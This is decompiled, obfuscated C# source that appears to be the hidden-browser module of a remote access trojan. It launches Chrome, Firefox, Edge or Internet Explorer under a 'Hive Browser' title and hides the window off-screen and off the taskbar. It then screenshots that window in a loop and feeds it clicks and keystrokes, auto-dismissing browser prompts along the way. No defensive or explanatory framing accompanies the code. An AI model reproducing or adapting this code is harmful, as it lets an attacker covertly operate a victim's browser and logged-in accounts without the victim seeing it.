using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class0
{
	public delegate bool Delegate0(IntPtr hwnd, int lParam);

	public struct Struct0
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;
	}

	public enum Enum0
	{
		const_0 = -20,
		const_1 = -6,
		const_2 = -8,
		const_3 = -12,
		const_4 = -16,
		const_5 = -21,
		const_6 = -4,
		const_7 = 8,
		const_8 = 0,
		const_9 = 4
	}

	[Flags]
	public enum Enum1
	{
		flag_0 = 0,
		flag_1 = 1,
		flag_2 = 2,
		flag_3 = 8,
		flag_4 = 0x20
	}

	private static Thread thread_0 = new Thread(smethod_4);

	private static IntPtr intptr_0;

	private static IntPtr intptr_1;

	private static Struct0 struct0_0 = default(Struct0);

	private static Bitmap bitmap_0;

	private static Graphics graphics_0;

	private static IntPtr intptr_2;

	private static long long_0;

	private static List<string> list_0 = new List<string>();

	private static object object_0 = new List<IntPtr>();

	[DllImport("user32.dll")]
	private static extern bool PrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

	[DllImport("user32.dll")]
	private static extern bool GetWindowRect(IntPtr hWnd, ref Struct0 lpRect);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	[DllImport("user32.dll")]
	public static extern int SetWindowLong(IntPtr hWnd, [MarshalAs(UnmanagedType.I4)] Enum0 nIndex, int dwNewintptr);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern uint SendMessageTimeout(IntPtr hWnd, int Msg, int countOfChars, StringBuilder text, Enum1 flags, uint uTImeoutj, out IntPtr result);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool EnumDesktopWindows(IntPtr hDesktop, Delegate0 lpEnumCallbackFunction, IntPtr lParam);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll")]
	private static extern IntPtr WindowFromPoint(Point p);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("dwmapi.dll", PreserveSig = false)]
	public static extern void DwmEnableComposition(bool bEnable);

	public static void smethod_0(string browser)
	{
		string title = "Hive Browser";
		try
		{
			DwmEnableComposition(bEnable: true);
		}
		catch (Exception)
		{
		}
		switch (browser)
		{
		case "Chrome":
			Process.Start("chrome", "--new-window \"data:text/html,<title>Hive Browser</title>\" --mute-audio --disable-audio --window-position=" + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Width - 5) + "," + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Height - 100));
			break;
		case "Firefox":
			Process.Start("firefox", "-new-window \"data:text/html,<title>Hive Browser</title>\"");
			break;
		case "Internet Explorer":
			title = "DuckDuckGo";
			Process.Start("iexplore", "-new -extoff duckduckgo.com");
			break;
		case "Edge":
			title = "DuckDuckGo";
			Process.Start("microsoft-edge:duckduckgo.com");
			break;
		}
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		intptr_0 = (IntPtr)0;
		IntPtr intPtr = default(IntPtr);
		do
		{
			if (intptr_0 == intPtr)
			{
				intptr_0 = smethod_14(title);
				continue;
			}
			stopwatch.Stop();
			Class9.ShowWindow(intptr_0, 0);
			SetWindowLong(intptr_0, Enum0.const_0, 128);
			Class9.ShowWindow(intptr_0, 5);
			SetWindowPos(intptr_0, (IntPtr)1, 10000, 10000, 776, 426, 64u);
			Stopwatch stopwatch2 = new Stopwatch();
			stopwatch2.Start();
			IntPtr intPtr2 = default(IntPtr);
			while (intPtr2 == intPtr)
			{
				intPtr2 = Class9.FindWindow(null, "Default Browser");
				if (stopwatch2.ElapsedMilliseconds >= 2000L)
				{
					break;
				}
				Class9.Sleep(250);
			}
			if (!(intPtr2 == intPtr))
			{
				Class9.SendMessage(intPtr2, 16, intPtr, intPtr);
			}
			break;
		}
		while (stopwatch.ElapsedMilliseconds < 8000L);
	}

	public static void smethod_1(object delay)
	{
		if (thread_0.ThreadState == System.Threading.ThreadState.Running)
		{
			thread_0.Abort();
		}
		thread_0 = new Thread(smethod_4);
		thread_0.IsBackground = true;
		thread_0.SetApartmentState(ApartmentState.STA);
		thread_0.Start(RuntimeHelpers.GetObjectValue(delay));
	}

	public static void smethod_2()
	{
		try
		{
			thread_0.Abort();
			IntPtr intPtr = default(IntPtr);
			Class9.SendMessage(intptr_0, 16, intPtr, intPtr);
			Class9.Sleep(2000);
			PostMessage(Class9.FindWindow(null, "Exit and close tabs?"), 256u, (IntPtr)13, (IntPtr)1);
			PostMessage(Class9.FindWindow(null, "Close tabs?"), 256u, (IntPtr)13, (IntPtr)1);
		}
		catch (Exception)
		{
		}
	}

	public static object[] smethod_3()
	{
		List<string> list = new List<string>();
		if (Directory.Exists(Interaction.Environ("appdata") + "\\Google\\Chrome") | Directory.Exists(Interaction.Environ("localappdata") + "\\Google\\Chrome"))
		{
			list.Add("Chrome");
		}
		if (Directory.Exists(Interaction.Environ("appdata") + "\\Mozilla\\Firefox") | Directory.Exists(Interaction.Environ("localappdata") + "\\Mozilla\\Firefox"))
		{
			list.Add("Firefox");
		}
		if (File.Exists(Interaction.Environ("localappdata") + "\\Microsoft\\WindowsApps\\MicrosoftEdge.exe"))
		{
			list.Add("Edge");
		}
		if (Directory.Exists(Interaction.Environ("appdata") + "\\Microsoft\\Internet Explorer") | Directory.Exists(Interaction.Environ("localappdata") + "\\Microsoft\\Internet Explorer"))
		{
			list.Add("Internet Explorer");
		}
		return list.ToArray();
	}

	[DllImport("user32.dll")]
	private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, uint flags);

	public static void smethod_4(object delay)
	{
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		while (true)
		{
			try
			{
				GetWindowRect(intptr_0, ref struct0_0);
				bitmap_0 = new Bitmap(struct0_0.int_2 - struct0_0.int_0 + 1, struct0_0.int_3 - struct0_0.int_1 + 1);
				graphics_0 = Graphics.FromImage((Image)(object)bitmap_0);
				intptr_2 = graphics_0.GetHdc();
				if (Conversions.ToBoolean(smethod_18()))
				{
					PrintWindow(intptr_0, intptr_2, 2u);
				}
				else
				{
					PrintWindow(intptr_0, intptr_2, 0u);
				}
				graphics_0.ReleaseHdc(intptr_2);
				graphics_0.Flush();
				graphics_0.Dispose();
				((Image)bitmap_0).Dispose();
				GC.Collect();
			}
			catch (Exception)
			{
				try
				{
					((Image)bitmap_0).Dispose();
					graphics_0.ReleaseHdc();
					graphics_0.Flush();
					graphics_0.Dispose();
				}
				catch (Exception)
				{
				}
			}
			Class9.Sleep(Conversions.ToInteger(delay));
		}
	}

	public static Bitmap smethod_5()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		Bitmap result = null;
		try
		{
			Bitmap val = new Bitmap(776, 426);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				SolidBrush val3 = (SolidBrush)Brushes.get_Red();
				try
				{
					val2.FillRectangle((Brush)(object)val3, 0, 0, 776, 426);
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			result = val;
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	public static void smethod_6(int x, int y)
	{
		Struct0 lpRect = default(Struct0);
		GetWindowRect(intptr_0, ref lpRect);
		Point point = new Point(10000 + x - lpRect.int_0, 10000 + y - lpRect.int_1);
		PostMessage(intptr_0, 513u, (IntPtr)0L, (IntPtr)smethod_16(point.X, point.Y));
	}

	public static void smethod_7(int x, int y)
	{
		Struct0 lpRect = default(Struct0);
		GetWindowRect(intptr_0, ref lpRect);
		Point point = new Point(10000 + x - lpRect.int_0, 10000 + y - lpRect.int_1);
		PostMessage(intptr_0, 514u, (IntPtr)0L, (IntPtr)smethod_16(point.X, point.Y));
	}

	public static void smethod_8(int x, int y)
	{
		Struct0 lpRect = default(Struct0);
		GetWindowRect(intptr_0, ref lpRect);
		new Point(10000 + x - lpRect.int_0, 10000 + y - lpRect.int_1);
		PostMessage(intptr_0, 516u, (IntPtr)0L, (IntPtr)smethod_16(x - lpRect.int_0, y - lpRect.int_1));
	}

	public static void smethod_9(int x, int y)
	{
		Struct0 lpRect = default(Struct0);
		GetWindowRect(intptr_0, ref lpRect);
		new Point(10000 + x - lpRect.int_0, 10000 + y - lpRect.int_1);
		PostMessage(intptr_0, 517u, (IntPtr)0L, (IntPtr)smethod_16(x - lpRect.int_0, y - lpRect.int_1));
	}

	public static void smethod_10(string k)
	{
		int num = Strings.AscW(k);
		if (num == 8 || num == 13)
		{
			PostMessage(intptr_0, 256u, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(k))), smethod_12(1, 30, IsExtendedKey: false, DownBefore: false));
			PostMessage(intptr_0, 257u, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(k))), smethod_13(1, 30, IsExtendedKey: false));
		}
		else
		{
			PostMessage(intptr_0, 258u, (IntPtr)Strings.AscW(k), (IntPtr)1);
		}
	}

	public static IntPtr smethod_11(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore, bool State)
	{
		int num = RepeatCount | (ScanCode << 16);
		if (IsExtendedKey)
		{
			num |= 0x10000;
		}
		if (DownBefore)
		{
			num |= 0x40000000;
		}
		if (State)
		{
			num |= int.MinValue;
		}
		return new IntPtr(num);
	}

	public static IntPtr smethod_12(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore)
	{
		return smethod_11(RepeatCount, ScanCode, IsExtendedKey, DownBefore, State: false);
	}

	public static IntPtr smethod_13(ushort RepeatCount, byte ScanCode, bool IsExtendedKey)
	{
		return smethod_11(RepeatCount, ScanCode, IsExtendedKey, DownBefore: true, State: true);
	}

	public static IntPtr smethod_14(string title)
	{
		list_0 = new List<string>();
		object_0 = new List<IntPtr>();
		Delegate0 lpEnumCallbackFunction = smethod_15;
		EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero);
		int num = list_0.Count - 1;
		IntPtr result = default(IntPtr);
		while (true)
		{
			if (num >= 0)
			{
				if (list_0[num].ToLower().Contains(title.ToLower()))
				{
					break;
				}
				num += -1;
				continue;
			}
			return result;
		}
		object obj = NewLateBinding.LateIndexGet(object_0, new object[1] { num }, (string[])null);
		if (obj == null)
		{
			return result;
		}
		return (IntPtr)obj;
	}

	public static bool smethod_15(IntPtr hWnd, int lParam)
	{
		StringBuilder stringBuilder = new StringBuilder(255);
		IntPtr hWnd2 = hWnd;
		int countOfChars = stringBuilder.Capacity + 1;
		StringBuilder text = stringBuilder;
		IntPtr result = IntPtr.Zero;
		SendMessageTimeout(hWnd2, 13, countOfChars, text, Enum1.flag_2, 1000u, out result);
		string text2 = stringBuilder.ToString();
		if (IsWindowVisible(hWnd) && !string.IsNullOrEmpty(text2))
		{
			object obj = object_0;
			Type type = null;
			string text3 = "Add";
			object[] array = new object[1] { hWnd };
			object[] array2 = array;
			string[] array3 = null;
			Type[] array4 = null;
			bool[] array5 = new bool[1] { true };
			NewLateBinding.LateCall(obj, type, text3, array2, array3, array4, array5, true);
			if (array5[0])
			{
				hWnd = (IntPtr)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(IntPtr));
			}
			list_0.Add(text2);
		}
		return true;
	}

	public static int smethod_16(int LoWord, int HiWord)
	{
		return (HiWord << 16) | (LoWord & 0xFFFF);
	}

	public static void smethod_17(int w, int h)
	{
		SetWindowPos(intptr_0, (IntPtr)1, 10000, 10000, w, h, 64u);
	}

	public static object smethod_18()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		if (oSVersion.Platform == PlatformID.Win32NT && version.Major == 6 && version.Minor != 0 && version.Minor != 1)
		{
			return true;
		}
		return false;
	}
}
